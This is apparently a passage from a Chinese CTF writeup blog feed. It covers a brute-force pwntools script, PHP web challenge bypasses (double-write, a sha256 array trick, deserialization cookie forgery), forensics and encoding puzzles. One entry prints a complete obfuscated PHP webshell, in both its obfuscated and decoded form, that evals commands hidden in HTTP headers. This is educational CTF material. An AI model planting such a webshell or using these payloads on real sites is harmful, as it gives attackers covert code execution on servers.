class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># def len_check(pad):</span></span><br><span class="line"><span class="comment">#     if len(pad) != 38:</span></span><br><span class="line"><span class="comment">#         return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 38位，</span></span><br><span class="line"><span class="comment"># def check1(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(0, int(len(pad)/2)+1):</span></span><br><span class="line"><span class="comment">#         if not pad[i].isupper():</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># isupper():大写，1-20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def check2(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(int(len(pad)/2)+1, len(pad)):</span></span><br><span class="line"><span class="comment">#         if not pad[i].islower():</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># islower():小写，21-38</span></span><br><span class="line"><span class="comment"># def check3(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(0, int(len(pad)/2)):</span></span><br><span class="line"><span class="comment">#         if ord(pad[i]) != ord(pad[i+1])-1:</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># 1-19  ABCDEFGHIJKLMNOPQRSTaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="comment"># zyxwvutsrqponmlkjihgfedcba</span></span><br><span class="line"><span class="comment"># zyxwvutsrqponmlkji</span></span><br><span class="line"><span class="comment"># def check4(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(int(len(pad)/2)+1, len(pad)-1):</span></span><br><span class="line"><span class="comment">#         if ord(pad[i]) != ord(pad[i+1])+1:</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTzyxwvutsrqponmlkji</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">strqian = <span class="string">&quot;ABCDEFGHIJKLMNOPQRST&quot;</span></span><br><span class="line">strhou = <span class="string">&quot;zyxwvutsrqponmlkji&quot;</span></span><br><span class="line">listqian = []</span><br><span class="line">listhou = []</span><br><span class="line"><span class="comment">#循环出所有前缀listqian</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strqian:</span><br><span class="line">        s = s + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+j)</span><br><span class="line">        <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    listqian.append(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(listqian)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#循环出所有后缀listhou</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strhou:</span><br><span class="line">        s = s + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-j)</span><br><span class="line">        <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    listhou.append(s)</span><br><span class="line"><span class="comment">#print(listhou)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        sendstr = listqian[i]+listhou[j]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>,<span class="number">27602</span>)</span><br><span class="line">            io.sendline(sendstr)</span><br><span class="line">            a = io.recvall()</span><br><span class="line">            <span class="comment"># io.recvuntil(&quot;[+]&quot;,)</span></span><br><span class="line">            <span class="comment"># a = io.recvuntil(&quot;.&quot;,)</span></span><br><span class="line">            <span class="comment">#print(a.encode())</span></span><br><span class="line">            <span class="comment">#if &quot;&#123;&quot; in str(a) or &quot;&#125;&quot; in str(a):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(a):</span><br><span class="line">                <span class="built_in">print</span>(sendstr)</span><br><span class="line">                <span class="comment">#io.interactive()</span></span><br><span class="line">                <span class="built_in">print</span>(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> baopo </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022 RITSEC CTF 部分writeup</title>
      <link href="/2022/04/02/2022-RITSEC-CTF-%E9%83%A8%E5%88%86writeup/"/>
      <url>/2022/04/02/2022-RITSEC-CTF-%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h3 id="Pretty-Horrible-Program-1"><a href="#Pretty-Horrible-Program-1" class="headerlink" title="Pretty Horrible Program 1"></a>Pretty Horrible Program 1</h3><p>考点：双写绕过preg_replace</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>];</span><br><span class="line">    <span class="variable">$to_replace</span> = <span class="string">&#x27;bingus&#x27;</span>;</span><br><span class="line">    <span class="variable">$clean_string</span> = preg_replace(<span class="string">&quot;/<span class="subst">$to_replace</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your string is: <span class="subst">$clean_string</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$clean_string</span> == <span class="variable">$to_replace</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;</span><br><span class="line">      output_flag();</span><br></pre></td></tr></table></figure><p>$clean_string = preg_replace(“/$to_replace/“, ‘’, $input);<br>关键代码，get传参一个bingus，由于preg_replace会把一个bingus替换为空，但是下面又要等于bingus，我们可以双写<code>bingbingusus</code><br><img src="/images/2022-RITSEC-CTF/1.png" alt="image-20220402162035760"></p><h3 id="Pretty-Horrible-Program-3"><a href="#Pretty-Horrible-Program-3" class="headerlink" title="Pretty Horrible Program 3"></a>Pretty Horrible Program 3</h3><p>考点：hash强碰撞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>]) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;&lt;h3 class=&quot;error&quot;&gt;Nice try, but it won\&#x27;t be that easy ;)&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>]) === hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>])) &#123;</span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;&lt;h3 class=&quot;error&quot;&gt;Your inputs don\&#x27;t match&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们需要输入input1和input2，并且1与2不能相同，但是他们的sha256要相同可以这样绕过<br><code>input1[]=1&amp;input2[]=2</code></p><p><img src="/images/2022-RITSEC-CTF/2.png" alt="image-20220402164521180"></p><h3 id="Pretty-Horrible-Program-2"><a href="#Pretty-Horrible-Program-2" class="headerlink" title="Pretty Horrible Program 2"></a>Pretty Horrible Program 2</h3><p>考点：简单php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//public $role = &#x27;User&#x27;;</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$role</span>=<span class="string">&quot;Admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function is_admin()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   if ($this-&gt;role == &#x27;Admin&#x27;) &#123;</span></span><br><span class="line">    <span class="comment">//     return true;</span></span><br><span class="line">    <span class="comment">//   &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//     return false;</span></span><br><span class="line">    <span class="comment">//   &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __sleep()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   return array($this-&gt;role);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$c</span> = serialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;<span class="comment">//O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;Admin&quot;;&#125;</span></span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里cookie 的role必须要是admin,所以我们把User换成admin，其他注释掉，输出就可以了<br>由于我们这里是post 和 cookie提交 ，要注意编码问题，我们这里直接urlencode，提交就可以了</p><p><img src="/images/2022-RITSEC-CTF/3.png" alt="image-20220402181841597"></p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> hash碰撞 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022hwsgogogo</title>
      <link href="/2022/01/26/2022hwsgogogo/"/>
      <url>/2022/01/26/2022hwsgogogo/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h5><p>考点：拼图+取证+Aztec 码<br>下载下来压缩包有两个附件，分别解压一下，一个是有许多图片，一个是一个raw文件，显然是取证了。<br>先看这个有许多小图片的压缩包，显然拼图了，总共256张图片，是16<em>16的图片，是160</em>100的小图片<br><strong><img src="/images/hws2022/1.png" alt="image-20220126202221239"></strong><br>直接<code>montage *png -tile 16x16 -geometry 160x100+0+0 out.png</code>合成一个大图片<br>这边用gaps拼了几次没出，果断把out.png改一下大小，大图室 2560<em>1600的，我们改成正正方形，1600</em>1600<br><img src="/images/hws2022/2.png" alt="image-20220126202810888"><br><code>gaps --image=out2.png --generations=15 --population=256 --size=100 --verbose</code><br>在拼一下就出来了，注意参数<br><img src="/images/hws2022/3.png" alt="image-20220126203016856"><br>flag关键字没有，搜一个zip，桌面上有csgo.zip<br><code> python vol.py -f 2.raw --profile=WinXPSP2x86 filescan | grep flag</code><br><code> python vol.py -f 2.raw --profile=WinXPSP2x86 filescan | grep zip</code><br><img src="/images/hws2022/4.png" alt="image-20220126203415648"><br><code>python vol.py -f 2.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002182dc0 -D ./dasctf -u</code><br>提一下，有密码,用刚刚的密码解压，里面是两个图片，第一个图片室csgo图片，第二个是一个码中间缺了定位符，用谷歌搜一下，是Aztec，在线网站<code>https://products.aspose.app/barcode/zh-hans/generate</code>，先生成一个aztec，把中间的定位符扣下来，然后贴上去，扫码就可以了。<br><img src="/images/hws2022/5.png" alt="image-2022012620341548"><br><img src="/images/hws2022/6.png" alt="image-20220126204727776"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> hws2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D.I.E&amp;Trinity CTF部分wp</title>
      <link href="/2022/01/24/D-I-E-Trinity-CTF%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/01/24/D-I-E-Trinity-CTF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/tjuctf/index.png" alt="image-20220124192143500"><br>emmm 天津大学和南京大学的招新赛，题目还是很有质量的，tcl了，有些题还是不会<br>记一下吧</p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h5><p>下载一个附件，file看一下，发现是data，不管了 ，直接foremost分离一下<br><code>foremost data</code><br>有两个图片一个jpg，一个png两个图片是一样的，盲猜<code>盲水印</code><br>项目下载<code>https://github.com/chishaxie/BlindWaterMark</code><br>直接<code>python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png</code><br><img src="/images/tjuctf/1.png" alt="image-20220124194256825">发现，图片不太清楚，问了下出题人，有alpha值，研究一下脚本<br><img src="/images/tjuctf/2.png" alt="image-20220124194320886"><br>看到 <code>--alpha &lt;float&gt;,  Manual setting alpha (default is 3.0)</code><br>默认值为三，我们调到5<code> python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png --alpha 5</code><br>还是不清楚，加到10  <code>python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png --alpha 10</code><br><img src="/images/tjuctf/3.png" alt="image-20220124194614378"></p><h5 id="ezdecode"><a href="#ezdecode" class="headerlink" title="ezdecode"></a>ezdecode</h5><p>签到题，是各种编码的组合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">编码1：You Know That</span><br><span class="line">ZmxhZ3t3M2xjMG1f   --&gt;base64</span><br><span class="line">flag&#123;w3lc0m_7o_amaz1n9_CTF_vv0RId_!&#125;</span><br><span class="line">编码2：Key == 2</span><br><span class="line">7_mznoaa19    --&gt;栅栏   key为为2</span><br><span class="line">编码3：Play With Bubble</span><br><span class="line">xilog-fahig-kalal-kytef-begig-nanyh-zumal-tuxox   --&gt;气泡</span><br><span class="line">`http://www.hiencode.com/bubble.html`</span><br><span class="line">_CTF_vv0RId_!&#125;</span><br></pre></td></tr></table></figure><h5 id="这里有后门！"><a href="#这里有后门！" class="headerlink" title="这里有后门！"></a>这里有后门！</h5><p>个人认为这个题还是非常有趣的，里面涉及的加密方法还没搞懂，写一下做题记录吧<br>拿到附件，题目已经说了，是后门，看了一下,显然是经过混淆加密的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="string">&#x27;S+)$p.iS=$iSq[$m[2][$z]iS]iSiS;if(strpos(iS$p,$h)===0iS)&#123;$s[$iiS]=iS&quot;&quot;;$iSpiS=$ss($p,3);&#125;if(arriSiSay&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;s=&amp;iS$_SESSiSION;$ss=&quot;subsiSiStr&quot;;$sliS=&quot;stiSrtolower&quot;;$i=$miS[1][iS0].iS$m[iS1][iS1];$h=$sl($ss(md5iS&#x27;</span>;</span><br><span class="line"><span class="variable">$X</span>=<span class="string">&#x27;($i.iS$kh),0,iS3)iS);$f=$sl(iS$ssiS(iSmd5($i.$kf),iS0iS,iS3));$p=&quot;&quot;;foriS($z=1;$z&lt;couiSiSnt($m[1]);$z+i&#x27;</span>;</span><br><span class="line"><span class="variable">$L</span>=str_replace(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crexxatex_fxxunxction&#x27;</span>);</span><br><span class="line"><span class="variable">$E</span>=<span class="string">&#x27;;$i&lt;$l;)&#123;foriS($j=0;(iS$j&lt;$ciS&amp;&amp;iS$i&lt;$l);$jiSiS++,iS$i++)&#123;$o.=$t&#123;$iiS&#125;^$k&#123;$j&#125;iS;iS&#125;iS&#125;riSeturn $o;&#125;$iSr=iSiS$&#x27;</span>;</span><br><span class="line"><span class="variable">$Q</span>=<span class="string">&#x27;=basiSiSe64_encode(x(giSzcompress($o)iS,$k)iS);print(&quot;iS&lt;$k&gt;iS$d&lt;/iS$k&gt;&quot;);@siSessioniS_destroyiS();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>=<span class="string">&#x27;_SiSERViSEiSR;iS$rr=@$r[&quot;HTTiSP_REFEiSRER&quot;iS];$ra=@$r[iS&quot;iSHTTP_ACCEiSPT_LANGiSUAGE&quot;]iS;ifiS($rr&amp;&amp;$iSra)&#123;$&#x27;</span>;</span><br><span class="line"><span class="variable">$l</span>=<span class="string">&#x27;iS$kiSh=&quot;3481&quot;iS;iS$kf=&quot;iS9diS7b&quot;;funiSctiSion x($t,$k)&#123;$c=strliSen($kiS);iSiS$l=strlen($tiS);$o=&quot;&quot;;foiSr(iS$i=0iS&#x27;</span>;</span><br><span class="line"><span class="variable">$h</span>=<span class="string">&#x27;ll(iS&quot;/([\\w])iS[\\w-]+(iS?:;q=0.iS([iSiS\\d]))?,?/&quot;,iS$riSa,iS$miS);if($q&amp;&amp;$m)&#123;@siSession_staiSrtiS(iS);$&#x27;</span>;</span><br><span class="line"><span class="variable">$Z</span>=<span class="string">&#x27;art();@evaiSl(@giSzuniSiSciSompress(@x(@baseiS64_decodeiS(pregiS_riSeplace(ariSray(&quot;/_/&quot;,&quot;/-/iS&quot;),arriSa&#x27;</span>;</span><br><span class="line"><span class="variable">$W</span>=<span class="string">&#x27;_key_exiSists(iS$i,$s))&#123;iS$siS[$i].=$piS;$e=iSiSstrpos($siS[$iiS]iS,$f);if($e)&#123;$k=$kh.$kiSf;ob_stiSiS&#x27;</span>;</span><br><span class="line"><span class="variable">$g</span>=<span class="string">&#x27;u=paiSrse_iSiSurl($rr);pariSse_siStr($u[&quot;queriSy&quot;],$iSq)iS;iSiS$q=array_iSvaluiSes($q);pregiS_match_a&#x27;</span>;</span><br><span class="line"><span class="variable">$D</span>=<span class="string">&#x27;y(iS&quot;/&quot;,iS&quot;iS+&quot;)iS,$ss($s[$i],iS0,$e)iS)),$k)))iS;$o=obiS_get_iSiScontents()iS;ob_eniSd_iScleaiSn();$d&#x27;</span>;</span><br><span class="line"><span class="variable">$O</span>=str_replace(<span class="string">&#x27;iS&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$l</span>.<span class="variable">$E</span>.<span class="variable">$p</span>.<span class="variable">$g</span>.<span class="variable">$h</span>.<span class="variable">$H</span>.<span class="variable">$X</span>.<span class="variable">$u</span>.<span class="variable">$W</span>.<span class="variable">$Z</span>.<span class="variable">$D</span>.<span class="variable">$Q</span>);</span><br><span class="line"><span class="variable">$q</span>=<span class="variable">$L</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$O</span>);<span class="variable">$q</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>google一下关键代码，直接出了一个解密网站<code>https://www.unphp.net/</code>把代码拿到这个网站解一下<br><img src="/images/tjuctf/4.png" alt="image-20220124195541546"><br>后面，搜到这个马子知道居然还可以直接输出<br><img src="/images/tjuctf/5.png" alt="image-20220124195909580"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$kh</span> = <span class="string">&quot;3481&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;9d7b&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;(<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>);<span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span>.= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rr</span> &amp;&amp; <span class="variable">$ra</span>) &#123;</span><br><span class="line">    <span class="variable">$u</span> = parse_url(<span class="variable">$rr</span>);</span><br><span class="line">    parse_str(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>], <span class="variable">$q</span>);</span><br><span class="line">    <span class="variable">$q</span> = array_values(<span class="variable">$q</span>);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$ra</span>, <span class="variable">$m</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$q</span> &amp;&amp; <span class="variable">$m</span>) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        <span class="variable">$s</span> = &amp; <span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span> = <span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>] . <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$h</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kh</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kf</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">1</span>;<span class="variable">$z</span> &lt; count(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++) <span class="variable">$p</span>.= <span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$p</span>, <span class="variable">$h</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$p</span> = <span class="variable">$ss</span>(<span class="variable">$p</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$i</span>, <span class="variable">$s</span>)) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>].= <span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span> = strpos(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="variable">$k</span> = <span class="variable">$kh</span> . <span class="variable">$kf</span>;</span><br><span class="line">                ob_start();</span><br><span class="line">                <span class="keyword">eval</span>(@gzuncompress(@x(base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), <span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span> = ob_get_contents();</span><br><span class="line">                